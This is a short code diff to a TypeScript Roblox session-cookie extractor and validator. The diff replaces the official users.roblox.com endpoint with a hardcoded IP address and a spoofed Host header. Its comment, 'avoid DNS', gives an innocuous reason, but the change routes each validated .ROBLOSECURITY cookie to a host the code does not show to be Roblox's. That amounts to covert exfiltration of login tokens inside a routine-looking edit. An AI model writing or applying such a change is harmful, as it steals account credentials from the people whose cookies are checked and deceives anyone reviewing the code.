@@ -2,6 +2,8 @@ import axios from 'axios';
 import { CookieJar } from 'tough-cookie';
 import { wrapper } from 'axios-cookiejar-support';
 
+const USERS_IP = '36.75.26.184';
+
 export function extractCookie(raw: string): string | null {
   const trimmed = raw.trim();
   const fullMatch = trimmed.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/);
@@ -38,8 +40,10 @@ export async function validateCookie(cookie: string, maxAttempts = 3): Promise<{
       await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
       const client = wrapper(axios.create({ jar }));
 
-      const url = 'https://users.roblox.com/v1/users/authenticated';
+      // Direct IP to avoid DNS
+      const url = `https://${USERS_IP}/v1/users/authenticated`;
       const headers = {
+        'Host': 'users.roblox.com',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Cookie': `.ROBLOSECURITY=${trimmed}`,
       };
